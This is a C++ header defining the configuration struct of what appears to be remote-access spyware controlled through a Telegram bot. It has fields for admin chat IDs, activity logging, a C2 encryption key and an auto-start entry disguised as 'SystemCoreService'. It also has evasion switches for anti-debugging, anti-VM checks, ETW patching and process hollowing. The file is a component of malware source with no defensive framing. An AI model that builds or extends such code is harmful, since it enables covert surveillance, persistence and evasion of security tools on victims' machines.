#pragma once

#include <cstdint>
#include <string>
#include <vector>

namespace nuub::domain::entities {

struct Config {
    std::string telegram_bot_token;
    std::int64_t admin_chat_id = 0;  // Single admin (legacy)
    std::vector<std::int64_t> admin_chat_ids;  // Multiple admins
    std::string pc_identifier = "PC-Principal";
    std::string encryption_password;
    std::string master_log_filename = "log_master.txt";
    std::string activity_log_filename = "activity_log.csv";
    std::string auto_start_entry_name = "SystemCoreService";
    std::string log_filename = "nuub.log";
    int heartbeat_interval_minutes = 30;
    std::string c2_encryption_key;  // Optional C2 encryption key

    // Evasion settings
    bool stealth_mode = false;
    bool anti_debug = true;
    bool anti_vm = false;
    bool etw_patch = true;
    bool process_hollowing = false;
};

} // namespace nuub::domain::entities
